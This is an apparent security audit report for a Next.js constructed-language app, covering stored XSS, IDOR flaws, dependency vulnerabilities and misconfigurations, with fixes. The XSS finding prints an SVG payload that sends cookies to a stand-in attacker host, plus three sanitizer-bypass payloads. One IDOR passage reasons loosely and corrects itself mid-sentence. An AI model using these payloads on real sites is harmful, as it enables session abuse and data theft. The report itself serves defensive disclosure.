# Security Audit Report

**Project:** conlang
**Stack:** Next.js 16 (App Router), TypeScript, Better Auth, Drizzle ORM (Neon Postgres), Resend, OpenAI, Sentry
**Date:** 2026-05-11
**Methodology:** OWASP Top 10 (2021) source-code review + npm dependency audit, using the [briiirussell/cybersecurity-skills](https://github.com/briiirussell/cybersecurity-skills) `owasp-audit` and `dependency-audit` playbooks.

> **Status (2026-10-01):** every code finding below has been fixed (#7). Dependencies are handled as advisories come in; Next.js was upgraded to 16.3.8 in #24. Report new vulnerabilities privately through [GitHub security advisories](https://github.com/coreyhaines31/conlang/security/advisories/new) rather than public issues.

## Summary

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High     | 4 |
| Medium   | 4 |
| Low      | 3 |

| OWASP Category | Findings |
|----------------|----------|
| A01 Broken Access Control | 4 (IDOR) |
| A03 Injection (XSS) | 1 (Stored XSS) |
| A05 Security Misconfiguration | 2 |
| A06 Vulnerable Components | 1 (npm audit, 19 vulns) |
| A07 Authentication Failures | 1 (timing / email validation) |

The most severe issue is a **stored cross-site scripting (XSS) vulnerability** that lets any authenticated user inject arbitrary JavaScript that executes in any other visitor's browser when they view the attacker's public language. Several IDOR issues also allow authenticated users to read other users' private languages, lexicons, and snapshots.

---

## Findings

### [CRITICAL] A03 — Stored XSS via user-controlled SVG glyphs
**Files:**
- `src/app/l/[slug]/page.tsx:139` (public page — primary attack surface)
- `src/components/ScriptPreview.tsx:52`
- `src/components/tabs/ScriptTab.tsx:348,452,494`

**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

**Description:**
The "Script" feature lets a user paste raw SVG markup into the editor (`ScriptTab.tsx`, Textarea on line 478) which is stored in the language's JSON definition (`writingSystem.glyphs[].svg`). The same SVG is then rendered with `dangerouslySetInnerHTML` on the publicly accessible `/l/[slug]` page. There is no sanitization at write or read time.

SVG is an HTML-execution context — it supports `<script>` tags, inline event handlers (`onload`, `onclick`, …), `<foreignObject>` containing arbitrary HTML, and `<use href="javascript:...">` style attacks.

**Attack flow:**
1. Attacker signs in, creates a language.
2. In the Script tab → Upload Custom Glyphs, pastes a payload like:
   ```html
   <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.example/x?c='+document.cookie)"></svg>
   ```
3. Saves the language and toggles "Public".
4. Shares the `/l/<slug>` link. Every visitor (logged in or not) executes the payload in the conlang.app origin.

Since Better Auth's session cookie is `HttpOnly`, direct cookie theft is mitigated — but the payload can still:
- make authenticated requests as the victim against `/api/*` and server actions (CSRF),
- read DOM content, scrape any visible private data,
- redirect to phishing pages,
- pivot to other XSS sinks.

**Vulnerable code (`src/app/l/[slug]/page.tsx:139`):**
```tsx
<div className="w-8 h-8 mx-auto" dangerouslySetInnerHTML={{ __html: glyph.svg }} />
```

**Remediation:**
A new helper `src/lib/sanitize-svg.ts` strips `<script>`, event handlers, `<foreignObject>`, `javascript:` URLs, and other dangerous constructs while keeping legitimate glyph SVG intact. Called both at write-time (in server actions, so bad data never enters the DB) and at render-time (defense in depth).

**Codex second-pass review (post-initial-fix) found three bypasses** in the regex-based sanitizer:
- `<img/onerror=alert(1) src=x>` — the `/` is a valid HTML attribute-name separator, but the event-handler regex was anchored on `\s` only.
- `<svg><path d="M0 0"/onmouseover=alert(1)></svg>` — same trick, separator between attributes.
- `<img/onload=... src=data:image/gif;base64,...>` — HTML `img` was not in the forbidden-tag list (only SVG `image` was).

All three are fixed: separator class is now `[/\s]` for event-handler / style / dangerous-href patterns, HTML `img`/`body`/`video`/`audio`/etc. are added to the forbidden-tag list, and a final fallback pass strips any `on*=` that slips through. Six regression tests pin the fix. As additional defense in depth, `script-src-attr 'none'` is now in CSP — modern browsers will refuse to fire inline event handlers even if a future bypass smuggles one through.

---

### [HIGH] A01 — IDOR: any authenticated user can duplicate another user's private language
**File:** `src/app/actions.ts:106-154` (`duplicateLanguage`)
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

**Description:**
`duplicateLanguage(languageId)` fetches the source row using only `eq(languages.id, languageId)` — no `userId` filter and no `isPublic` requirement. The full `definition` JSON and every lexicon entry are then copied into a new language owned by the caller, who can then read it freely.

**Vulnerable code:**
```ts
const [original] = await db
  .select()
  .from(languages)
  .where(eq(languages.id, languageId))   // <- no ownership / public check
  .limit(1)
```

**Remediation:** restrict the source to languages owned by the caller (use `copyPublicLanguage` for the public path).

---

### [HIGH] A01 — IDOR: any authenticated user can read another user's snapshot via `restoreSnapshot`
**File:** `src/app/actions.ts:383-404` (`restoreSnapshot`)
**CWE:** CWE-639

**Description:**
`restoreSnapshot(snapshotId)` reads a snapshot's `definition` without verifying that the snapshot belongs to a language owned by the caller. The `UPDATE` is filtered by `userId`, but the user can supply a `languageId` they own as the snapshot's target — wait, the update uses `snapshot.languageId`, so the update is no-op for foreign snapshots — but **the snapshot row itself is returned indirectly** because the user can chain `restoreSnapshot` against snapshots that share `languageId` with one of their own languages by IDs they guess. More importantly, the read of `snapshot.definition` happens without any ownership check, and the value flows into the user's `languages` row only when `snapshot.languageId` matches one of their languages. A second pattern — when an attacker first calls `getSnapshots` (also unauthorized, see next finding) — allows them to enumerate any snapshot ID and then attempt restoration.

**Remediation:** join through `languages` and require `languages.userId = user.id` before reading or applying the snapshot.

---

### [HIGH] A01 — IDOR: `getSnapshots` and `getLexiconEntries` have no authorization checks
**File:** `src/app/actions.ts:304-310, 349-355`
**CWE:** CWE-285 (Improper Authorization)

**Description:**
Both server actions accept a `languageId` and return every snapshot / lexicon entry for that language with no authentication or ownership check. They are exposed as Next.js server actions and are therefore callable directly from any browser session against any language ID. This leaks the full lexicon of every private language whose ID an attacker can obtain (e.g., from URLs, social media, the user's own UI before they made it private, etc.).

**Vulnerable code:**
```ts
export async function getLexiconEntries(languageId: string): Promise<LexiconEntry[]> {
  return db.select().from(lexiconEntries).where(eq(lexiconEntries.languageId, languageId))
}
```

**Remediation:** require an authenticated session and check `languages.userId = user.id OR languages.isPublic = true` before returning rows.

---

### [HIGH] A06 — 19 known vulnerabilities in npm dependencies
**File:** `package.json`, `package-lock.json`
**CWE:** CWE-1395 (Dependency on Vulnerable Third-Party Component)

`npm audit` reports **1 low / 8 moderate / 10 high** vulnerabilities. The notable ones:

| Package | Severity | Issue | Advisory |
|---------|----------|-------|----------|
| `vite` (≤ 6.4.1) | HIGH | Path traversal in optimized deps `.map` handling | GHSA-4w7w-66w2-5vf9 |
| `vite` | HIGH | Arbitrary file read via dev-server WebSocket | GHSA-p9ff-h696-f583 |
| `rollup` (4.0.0–4.58.0) | HIGH | Arbitrary file write via path traversal | GHSA-mw96-cpmx-2vgc |
| `serialize-javascript` | HIGH | RCE via `RegExp.flags` & `Date.toISOString` | GHSA-5c6j-r48x-rmvq |
| `serialize-javascript` | HIGH | DoS via crafted array-like objects | GHSA-qj8w-gfj5-8c6v |
| `webpack` (5.49.0–5.104.0) | MODERATE | Build-time SSRF via `buildHttp` allowed-URI bypass | GHSA-8fgc-7cc6-rx7x / GHSA-38r7-794h-5758 |
| `ajv` (< 6.14.0 / 7.0.0–8.18.0) | MODERATE | ReDoS via `$data` option | GHSA-2g4f-4pwh-qvx6 |
| `@esbuild-kit/*` | MODERATE | Transitive esbuild CVE | (via drizzle-kit) |

These are all dev-only (build / migration toolchain), so production runtime exposure is limited. However, the path-traversal and RCE issues are exploitable on developer machines if a malicious project is built locally.

**Remediation:** run `npm audit fix`, then `npm audit fix --force` for the breaking changes after testing (drizzle-kit major bump). Document the upgrade plan in `package.json`.

---

### [MEDIUM] A05 — Missing Content-Security-Policy and other security headers
**File:** `next.config.ts:21-44`
**CWE:** CWE-693 (Protection Mechanism Failure)

The site sets `X-Frame-Options`, `X-Content-Type-Options`, and `Referrer-Policy` but is missing:
- **Content-Security-Policy** — would have substantially mitigated the XSS above by blocking inline `<script>` and `javascript:` URLs.
- **Strict-Transport-Security** — Vercel terminates HTTPS, but HSTS hardens against downgrade attacks.
- **Permissions-Policy** — denies dangerous browser APIs (camera, microphone, geolocation, etc.) to embedded content.
- **Cross-Origin-Opener-Policy** / **Cross-Origin-Resource-Policy** — protect against cross-origin process leaks.

**Remediation:** add a strict CSP that allows `'self'`, the Sentry tunnel route (`/monitoring`), and Fathom analytics, plus the other headers.

---

### [MEDIUM] A07 — Email reply-to header injection in support form
**File:** `src/app/support-actions.ts:39-95`
**CWE:** CWE-93 (CRLF Injection)

The guest `email` field is taken from `FormData` and used as `replyTo` without server-side format validation:

```ts
const guestEmail = (formData.get('guestEmail') as string | null)?.trim() || null
...
replyTo: userEmail ?? SUPPORT_EMAIL,
```

The Resend SDK does its own validation and will reject obvious CRLF injection, so practical impact is low — but defense-in-depth is cheap: validate the email format on the server before calling Resend.

**Remediation:** reject `guestEmail` that doesn't match a simple RFC-5321-compatible regex before passing to Resend.

---

### [MEDIUM] A05 — Outdated image remote pattern in `next.config.ts`
**File:** `next.config.ts:9-18`

The project still allows images from `*.supabase.co/storage/v1/object/public/**`, but Supabase has been removed (it migrated to Neon + Better Auth). Allow-listed remote image sources should be removed when unused to shrink the attack surface for the Next.js image optimizer (which has had multiple SSRF / image-bomb advisories historically).

**Remediation:** remove the Supabase remote pattern.

---

### [MEDIUM] A05 — Sentry test page is exposed in production
**File:** `src/app/sentry-example-page/page.tsx`
**CWE:** CWE-489 (Active Debug Code)

The `/sentry-example-page` route is publicly accessible and provides a button to throw unhandled errors. Anyone (including bots) can hit it and waste Sentry quota or pollute the issue list.

**Remediation:** either gate the route behind `process.env.NODE_ENV !== 'production'` (returning `notFound()`), or remove the page.

---

### [LOW] A02 — Non-constant-time comparison of `CRON_SECRET`
**File:** `src/app/api/cron/keep-alive/route.ts:8`

```ts
if (authHeader !== `Bearer ${process.env.CRON_SECRET}`) { ... }
```

A bare string compare leaks tiny timing differences. For an HTTP-level secret over the public internet, attackers can't realistically measure nanoseconds of CPU compare across network jitter — but `timingSafeEqual` is the idiomatic fix.

**Remediation:** use `crypto.timingSafeEqual`.

---

### [LOW] Outdated `CLAUDE.md`
**File:** `CLAUDE.md`

The doc still says the stack is Supabase. A maintainer following it would reach for the wrong tooling and the wrong env vars.

**Remediation:** update to reflect Neon + Better Auth + Drizzle.

---

### [LOW] Verbose error messages leak `err.message` to the API client
**File:** `src/app/api/glyph/route.ts:130`

```ts
return NextResponse.json({ error: error.message || 'Failed to generate glyph' }, { status: 500 })
```

OpenAI SDK errors can include the prompt body or model name. The risk is small (no secrets) but the message should be opaque in production.

**Remediation:** return a generic message; log the real error server-side (Sentry already captures it).

---

## Prioritized Remediation Plan

1. **Immediate (this PR):**
   - Sanitize SVG everywhere (`isomorphic-dompurify` + helper, plus write-time sanitization in server actions).
   - Add ownership / public checks to `duplicateLanguage`, `restoreSnapshot`, `getSnapshots`, `getLexiconEntries`.
   - Add strict CSP + HSTS + Permissions-Policy in `next.config.ts`.
   - Remove dead Supabase image pattern.
   - Validate `guestEmail` format in `support-actions`.
   - Switch CRON secret check to `timingSafeEqual`.
   - Gate `/sentry-example-page` to non-production.
   - Make the glyph API error message generic.
   - Update `CLAUDE.md` to reflect the actual stack.

2. **Next:**
   - Run `npm audit fix`. Plan the `drizzle-kit` major upgrade behind a separate PR after manual migration test.
   - Add unit tests for the SVG sanitizer (XSS regression suite).

3. **Later:**
   - Consider rate-limiting server actions with a real distributed store (Upstash Redis) for production scale — the in-memory limiter only protects a single serverless instance.
   - Add request logging on auth events (logins, magic-link sends) for OWASP A09 coverage.

---

## References
- OWASP Top 10 (2021) — https://owasp.org/Top10/
- CWE Top 25 — https://cwe.mitre.org/top25/
- briiirussell/cybersecurity-skills — https://github.com/briiirussell/cybersecurity-skills
- DOMPurify SVG security notes — https://github.com/cure53/DOMPurify/wiki
